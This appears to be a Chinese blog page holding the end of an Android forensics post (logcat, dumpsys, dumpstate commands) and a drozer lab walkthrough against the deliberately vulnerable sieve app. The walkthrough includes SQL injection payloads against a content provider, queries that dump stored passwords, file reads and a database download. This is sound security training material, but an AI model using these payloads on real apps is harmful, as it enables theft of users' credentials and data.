<h3 id="4-2_Logcat">4.2 Logcat</h3><p>Logcat 显示系统更新和应用程序调试信息 <strong>查看无线电日志</strong>：</p>
<blockquote>
<p>adb shell logcat -b radio</p>
</blockquote>
<p>这些日志有如下信息： - 事件时间（以UNIX时间格式表达） - 蜂窝调制解调器进行通信使所使用的AT命令 - 接收者、时间以及编码的短信消息 - 终端设备的蜂窝IP地址、网络以及地点信息 - 无线通信服务提供商信息</p>
<p><em>tips Unix 时间转标准时间:</em></p>
<blockquote>
<p>date -d @1407199900</p>
</blockquote>
<p><img src="http://dahan.qiniudn.com/2014.8.7forensics4.png" alt="Alt text"></p>
<p><strong>查看事件日志</strong></p>
<blockquote>
<p>adb shell logcat -b event</p>
</blockquote>
<h3 id="4-3_dumpsys">4.3 dumpsys</h3><p>dumpsys提供关于服务、存储及系统其他方面很细节的信息。</p>
<blockquote>
<p>dumpsys [Option] [package_name | pid] Option: meminfo 显示内存信息 cpuinfo 显示CPU信息 account 显示accounts信息,感觉这个最有用了 activity 显示所有的activities的信息 window 显示键盘，窗口和它们的关系 wifi 显示wifi信息 location 显示位置信息，有基站和GPS的 更多信息： 1 SurfaceFlinger 2 accessibility 3 account 4 activity 5 alarm 6 appwidget 7 audio 8 backup 9 battery 10 batteryinfo 11 bluetooth 12 bluetooth_a2dp 13 clipboard 14 connectivity 15 content 16 cpuinfo 17 device_policy 18 devicestoragemonitor 19 diskstats 20 dropbox 21 entropy 22 ethernet 23 hardware 24 input_method 25 iphonesubinfo 26 isms 27 keybar 28 location 29 media.audio_flinger 30 media.audio_policy 31 media.camera 32 media.player 33 meminfo 34 mount 35 netstat 36 network_management 37 notification 38 package 39 permission 40 phone 41 power 42 search 43 sensorservice 44 simphonebook 45 statusbar 46 telephony.registry 47 throttle 48 uimode 49 usagestats 50 vibrator 51 wallpaper 52 wifi 53 window</p>
</blockquote>
<h3 id="4-4_dumpstate">4.4 dumpstate</h3><p>显示了很多调试信息和系统信息。 dumpstate信息：</p>
<table><br>  <thead><br>    <tr><br>      <th align="left"><br>        分段区域<br>      </th><br><br>      <th align="left"><br>        文件或者命令<br>      </th><br><br>      <th align="left"><br>        备注<br>      </th><br>    </tr><br>  </thead><br><br>  <tbody><br>    <tr><br>      <td align="left"><br>        Strack traces<br>      </td><br><br>      <td align="left"><br>        没有<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Device info<br>      </td><br><br>      <td align="left"><br>        没有<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        System<br>      </td><br><br>      <td align="left"><br>        没有<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Memory info<br>      </td><br><br>      <td align="left"><br>        /proc/meminfo<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Cpu info<br>      </td><br><br>      <td align="left"><br>        top -n 1 -d 1 -m 30 -t<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Procrank<br>      </td><br><br>      <td align="left"><br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Virtual memory stats<br>      </td><br><br>      <td align="left"><br>        /proc/vmstat<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Vmalloc info<br>      </td><br><br>      <td align="left"><br>        /proc/vmallocinfo<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Slab info<br>      </td><br><br>      <td align="left"><br>        /proc/slabinfo<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Zone info<br>      </td><br><br>      <td align="left"><br>        /proc/zoneinfo<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        System log<br>      </td><br><br>      <td align="left"><br>        logcat -v time -d <em>:v<br>      </em></td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Envent log<br>      </td><br><br>      <td align="left"><br>        logcat -b envents -v time -d :v<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Radio log<br>      </td><br><br>      <td align="left"><br>        logcat -b radio -v time -d *:v<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Network interfaces<br>      </td><br><br>      <td align="left"><br>        netcfg<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Network routes<br>      </td><br><br>      <td align="left"><br>        /proc/net/route<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Arp cache<br>      </td><br><br>      <td align="left"><br>        /proc/net/arp<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Dump Wi-Fi firmware log<br>      </td><br><br>      <td align="left"><br>        su root dhutil -i eth0 upload/data/local/tmp/ wlan_crash.dump<br>      </td><br><br>      <td align="left"><br>        命令未成功<br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        System propertiess<br>      </td><br><br>      <td align="left"><br>        没有<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Kernel log<br>      </td><br><br>      <td align="left"><br>        dmesg<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Kernel wakelocks<br>      </td><br><br>      <td align="left"><br>        /proc/wakelocks<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Kernel cpufreq<br>      </td><br><br>      <td align="left"><br>        /sys/devices/system/cpu/cpu0/cpufreq/stats/time_in_state<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Vold dump<br>      </td><br><br>      <td align="left"><br>        vdc dump<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Secure containers<br>      </td><br><br>      <td align="left"><br>        vdc asec list<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Processes<br>      </td><br><br>      <td align="left"><br>        ps -p<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Processes and threads<br>      </td><br><br>      <td align="left"><br>        ps -t -p -p<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Librank<br>      </td><br><br>      <td align="left"><br>        (librank)<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Binder failed transaction log<br>      </td><br><br>      <td align="left"><br>        /proc/binder/failed_transcation_log<br>      </td><br><br>      <td align="left"><br>        华为M1未发现<br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Binder transaciton log<br>      </td><br><br>      <td align="left"><br>        /proc/binder/transcation_log<br>      </td><br><br>      <td align="left"><br>        华为M1未发现<br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Binder transcations<br>      </td><br><br>      <td align="left"><br>        /proc/binder/transcations<br>      </td><br><br>      <td align="left"><br>        华为M1未发现<br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Binder stats<br>      </td><br><br>      <td align="left"><br>        /proc/binder/stats<br>      </td><br><br>      <td align="left"><br>        华为M1未发现<br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Binder process stat<br>      </td><br><br>      <td align="left"><br>        sh -c cat/proc/binder/proc/ -p<br>      </td><br><br>      <td align="left"><br>        华为M1未发现<br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        File System and free space<br>      </td><br><br>      <td align="left"><br>        df<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Package settings<br>      </td><br><br>      <td align="left"><br>        /data/system/packages.xml<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Package uid errors<br>      </td><br><br>      <td align="left"><br>        /data/system/uiderrors.txt<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Last kmsg<br>      </td><br><br>      <td align="left"><br>        /proc/last_kmsg<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Last radio log<br>      </td><br><br>      <td align="left"><br>        parse_radio_log/proc/last_radio_log<br>      </td><br><br>      <td align="left"><br>        华为M1未发现<br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Last panic console<br>      </td><br><br>      <td align="left"><br>        /data/dontpanic/apanic_console<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Last panic threads<br>      </td><br><br>      <td align="left"><br>        /data/dontpanic/apanic_threads<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Blocked process wait<br>      </td><br><br>      <td align="left"><br>        没有<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        channels<br>      </td><br><br>      <td align="left"><br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Backlights<br>      </td><br><br>      <td align="left"><br>        没有<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br><br>    <tr><br>      <td align="left"><br>        Dumpsys<br>      </td><br><br>      <td align="left"><br>        dumpsys<br>      </td><br><br>      <td align="left"><br>      </td><br>    </tr><br>  </tbody><br></table>

<h3 id="4-5_bugreporter">4.5 bugreporter</h3><p>将logcat、dumpsys和dumpstate输出结合在一起，提交调试报告。 可将结果重定向到一个文件中，以便分析。</p>
<h2 id="5_RAM进程内存转储">5 RAM进程内存转储</h2><p>在POSIX兼容的平台上，SIGUSR1和SIGUSR2是发送给一个进程的信号，它表示了用户定义的情况。它们的符号常量在头文件signal.h中定义。在不同的平台上，信号的编号可能发生变化。</p>
<p>Android将应用程序所使用的内存转储成为一个文件的机制：向该应用程序发送一个特别的信号（SIGUSR1），信号编号为1294。 具体操作步骤： S1 改变转储结果所在目录的访问权限：</p>
<blockquote>
<p>adb shell su root chmod 777 /data/misc</p>
</blockquote>
<p>S2 在获取应用程序的进程号，比如美团客户端的：</p>
<blockquote>
<p>adb shell ps | grep meituan</p>
</blockquote>
<p><img src="http://dahan.qiniudn.com/2014.8.7forensics5.png" alt="Alt text"></p>
<p>其PID为14606</p>
<p>S3 使用kill命令向进程发送信号：</p>
<blockquote>
<p>kill -10 14606</p>
</blockquote>
<p>可是没有成功，后来查询stack overflow才知道，在新Android的新平台上已经舍弃了这种方法。 可以使用MAT。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-使用drozer对Android应用进行安全评估" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/11/02/使用drozer对Android应用进行安全评估/" class="article-date">
  	<time datetime="2015-11-01T18:28:21.000Z" itemprop="datePublished">2015-11-02</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/11/02/使用drozer对Android应用进行安全评估/">使用drozer对Android应用进行安全评估</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="使用drozer对Android应用进行安全评估的测试例子">使用drozer对Android应用进行安全评估的测试例子</h1><p>看着drozer的用户说明文档，试了几个Android App,测试发现这几个App都基本没什么问题，只好又用drozer提供的sieve来进行练习了。进行安装评估的步骤一般也就是下面的标题步骤了。</p>
<h2 id="1_在Android设备上安装使用sieve">1 在Android设备上安装使用sieve</h2><p>sieve是一个密码管理器App，用来展示Android应用的一些共同缺陷，可以用来练习使用drozer。 <a href="https://www.mwrinfosecurity.com/system/assets/380/original/sieve.apk" target="_blank" rel="external">https://www.mwrinfosecurity.com/system/assets/380/original/sieve.apk</a>下载sieve.apk。 打开模拟器，安装sieve： <code>adb intsall sieve apk</code> 然后设置sieve，第一次使用需要设置打开sieve软件的密码和PIN码。 给sieve增加内容，添加一些要管理的帐号密码信息 <img src="http://dahan.qiniudn.com/2014.7.25sieve1.png" alt="Alt text"></p>
<p><img src="http://dahan.qiniudn.com/2014.7.25sieve2.png" alt="Alt text"></p>
<p>在seting里面还有其他的功能：</p>
<p><img src="http://dahan.qiniudn.com/2014.7.25sieve3.png" alt="Alt text"></p>
<h2 id="2_获取App_Package信息">2 获取App Package信息</h2><p>drozer每个模块的作用： <img src="http://dahan.qiniudn.com/2014.7.25sieve4.png" alt="Alt text"></p>
<p>获取App包信息的模块是<em>\</em>app.package.* **: <img src="http://dahan.qiniudn.com/2014.7.25sieve5.png" alt="Alt text"></p>
<h3 id="2-1获取获取Android设备上的所有的安装的App的包名">2.1获取获取Android设备上的所有的安装的App的包名</h3><p>命令是：</p>
<blockquote>
<p>run app.package.info -a com.mwr.example.sieve</p>
<p>run app.package.list</p>
</blockquote>
<p>这条命令会把所有的App都列出来，如果想具体查找某个App可加上<strong>-f [App关键字]</strong>的参数，如查找sieve在Android设备中的包名：</p>
<blockquote>
<p>run app.package.list -f sieve</p>
</blockquote>
<p><img src="http://dahan.qiniudn.com/2014.7.25sieve6.png" alt="Alt text"></p>
<p><strong>注意:</strong>在输入命令时可以使用<em>Tab</em>键自动补齐 需要记住com.mwr.example.sieve的包名，以后的命令要针对这个操作</p>
<h3 id="2-2获取sieve的一些基本信息">2.2获取sieve的一些基本信息</h3><p>命令是：</p>
<blockquote>
<p>run app.package.info -a com.mwr.example.sieve</p>
</blockquote>
<p><img src="http://dahan.qiniudn.com/2014.7.25sieve7.png" alt="Alt text"></p>
<p>可以看到Sieve的版本信息，数据存储的目录，用户ID,组ID,是否有共享库，还有权限信息等。</p>
<h3 id="2-3Itentify_the_Attack_Surface(确定攻击面？)">2.3Itentify the Attack Surface(确定攻击面？)</h3><p>这个测试教程主要关注的是Android 固有的IPC通信机制的脆弱性，这些特点导致了App泄漏敏感信息给同一台设备上的其它App。 查找可以进行Attack Surface的组件的命令：</p>
<blockquote>
<p>run app.package.attacksurface com.mwr.example.sieve</p>
</blockquote>
<p><img src="http://dahan.qiniudn.com/2014.7.25sieve8.png" alt="Alt text"></p>
<p>结果显示了潜在可以利用的组件个数： “exported”表示组件可以被其他App使用。 services is debuggable表示我们可以用adb绑定一个调试器到进程。</p>
<h3 id="2-4进一步获取Attack_Surface的信息">2.4进一步获取Attack Surface的信息</h3><p>如进一步获取ativity组建的attack surface信息的命令是：</p>
<blockquote>
<p>run app.activity.info -a com.mwr.example.sieve</p>
</blockquote>
<p><img src="http://dahan.qiniudn.com/2014.7.25sieve9.png" alt="Alt text"></p>
<p>其中上图的MainLoginActivity是程序启动时主界面，必须是exported，其他两个activity是理论上说是不能exported的。</p>
<h3 id="2-5启动Activities">2.5启动Activities</h3><p>上图的PWList和FileSelectActivity是exported并且不需要任何权限，我们可以用drozer启动他们，比如感觉PWList这个含金量应该大一点，所以就启动它了，命令是：</p>
<blockquote>
<p>run app.activity.start –component com.mwr.example.sieve com.mwr.example.sieve.PWList</p>
</blockquote>
<p>启动后的效果：</p>
<p><img src="http://dahan.qiniudn.com/2014.7.25sieve10.png" alt="Alt text"></p>
<p>app.activity.start的使用方法：</p>
<blockquote>
<p>help app.activity.start usage: run app.activity.start [-h] [–action ACTION] [–category CATEGORY [CATEGORY …]] [–component PACKAGE COMPONENT] [–data-uri DATA_URI] [–extra TYPE KEY VALUE] [–flags FLAGS [FLAGS …]] [–mimetype MIMETYPE]</p>
<p>Starts an Activity using the formulated intent.</p>
</blockquote>
<h3 id="2-6从Content_Provider中获取信息">2.6从Content Provider中获取信息</h3><p>接上2.3节，进一步获取content provider的attact surface的信息的命令是：</p>
<blockquote>
<p>run app.provider.info -a com.mwr.example.sieve</p>
</blockquote>
<p><img src="http://dahan.qiniudn.com/2014.7.25sieve11.png" alt="Alt text"> 从上图可以看到2.3节中两个exported的content provider的具体信息，包括名字，权限，访问路径等。</p>
<h4 id="2-6-1查找可以访问content_provider的URI（数据泄漏）">2.6.1查找可以访问content provider的URI（数据泄漏）</h4><p>从上节图中我们猜测DBContentProvider会有某种格式的数据库，但是我们不知道其中的数据是如何组织的。Content URI必须是 “<em>content://<authority>/</authority></em>” 的形式,因此我们可以构造部分的content URIs来访问DBcontent Provider。 上图存在一个需要READ_KEYS和WRITE_KEYS权限才能读和写的“/Keys”的路径。</p>
<p>drozer的scanner模块提供了一些方法去猜测可能存在的content URIs：</p>
<blockquote>
<p>run scanner.provider.finduris -a com.mwr.example.sieve</p>
</blockquote>
<p><img src="http://dahan.qiniudn.com/2014.7.25sieve12.png" alt="Alt text"> 上图中检测出了可以访问content的URI，接下来我们可以用drozer的其他模块和URI从content中获取，甚至更改信息。 如：</p>
<blockquote>
<p>run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –vertical</p>
</blockquote>
<p><img src="http://dahan.qiniudn.com/2014.7.25sieve13.png" alt="Alt text"> 如上图我们获取了用户名，邮箱帐号，和Base64编码的密码字符串。</p>
<h4 id="2-6-2进行SQL注入">2.6.2进行SQL注入</h4><p>Android操作系统建议使用SQLite数据库存储用户数据。SQLite数据库使用SQL语句，所以可以进行SQL注入。 <strong>使用<em>projection</em>参数和<em>seleciton</em>参数可以传递一些简单的SQL注入语句到Content provider</strong>。如：</p>
<blockquote>
<p>run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “‘“</p>
</blockquote>
<p><img src="http://dahan.qiniudn.com/2014.7.25sieve14.png" alt="Alt text"></p>
<blockquote>
<p>run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –selection “‘“</p>
</blockquote>
<p><img src="http://dahan.qiniudn.com/2014.7.25sieve15.png" alt="Alt text"></p>
<p>上面两条命令执行后Android设备返回了非常详细的错误信息。</p>
<p>使用Sql注入列出数据库中的所有数据表：</p>
<blockquote>
<p>run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “* FROM SQLITE_MASTER WHERE type=’table’;–”</p>
</blockquote>
<p><img src="http://dahan.qiniudn.com/2014.7.25sieve16.png" alt="Alt text"></p>
<p><strong>使用SQL注入列出数据表的内容</strong>：</p>
<blockquote>
<p>run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “* FROM Key;–”</p>
</blockquote>
<p><img src="http://dahan.qiniudn.com/2014.7.25sieve17.png" alt="Alt text"></p>
<h4 id="2-6-3从File_System-backed_Content_Providers获取信息">2.6.3从File System-backed Content Providers获取信息</h4><p>File System-backed Content Provider提供了访问底层文件系统的方法，Android沙盒会阻止App共享文件允许，而File System-backed Content Provider允许App共享文件。 对于sieve来说，我们可以推测出的FileBackupProvider就是一个file system-backed content provider。 我们可以使用drozer的<strong>app.provider.read模块查看某个文件</strong>：</p>
<blockquote>
<p>run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</p>
</blockquote>
<p><img src="http://dahan.qiniudn.com/2014.7.25sieve18.png" alt="Alt text"></p>
<p><strong>可以使用app.provider.download下载文件</strong></p>
<blockquote>
<p>run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/user/database.db</p>
</blockquote>
<h4 id="2-6-4检查Content_Provider的脆弱性">2.6.4检查Content Provider的脆弱性</h4><p><strong>检查是否有SQL注入：</strong></p>
<blockquote>
<p>run scanner.provider.injection -a com.mwr.example.sieve</p>
</blockquote>
<p><img src="http://dahan.qiniudn.com/2014.7.25sieve19.png" alt="Alt text"></p>
<p><strong>检查是否存在遍历文件的漏洞</strong></p>
<blockquote>
<p>run scanner.provider.traversal -a com.mwr.example.sieve</p>
</blockquote>
<p><img src="http://dahan.qiniudn.com/2014.7.25sieve20.png" alt="Alt text"></p>
<p><strong>总结体会</strong>：我觉得在刚开始获取了软件包的基本信息后，就先用模块scanner里面的工具扫一扫，找到一些漏洞或者利用点后再进行下一步。</p>
<h3 id="2-7和Services交互">2.7和Services交互</h3><p><strong>获取是exported状态的services的命令：</strong></p>
<blockquote>
<p>run app.service.info -a com.mwr.example.sieve</p>
</blockquote>
<p><img src="http://dahan.qiniudn.com/2014.7.25sieve21.png" alt="Alt text"></p>
<p>关于Services的模块： <img src="http://dahan.qiniudn.com/2014.7.25sieve22.png" alt="Alt text"></p>
<p>如向某个服务发送信息：</p>
<blockquote>
<p>run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService –msg 1 5 3</p>
</blockquote>
<p>返回的结果： <img src="http://dahan.qiniudn.com/2014.7.25sieve13.png" alt="Alt text"> 没搞明白为什么返回这个，段数还不够。</p>
<h3 id="2-8_其他常用模块">2.8 其他常用模块</h3><ul>
<li>shell.start 在Android设备上开启一个交互式Linux Shell</li>
<li>tools.file.upload / tools.file.download</li>
<li>tools.setup.busybox / tools.setup.minimalsu 安装busybox或者minimalsu到Android设备上</li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
    	<div class="footer-left">
    		&copy; 2015 憨哥
    	</div>
      	<div class="footer-right">
      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
      	</div>
    </div>
  </div>
</footer>
    </div>
    
  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">


<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: true
	}
</script>
<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js" type="text/javascript"></script>
<script src="/js/main.js" type="text/javascript"></script>






<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  </div>
</body>
</html>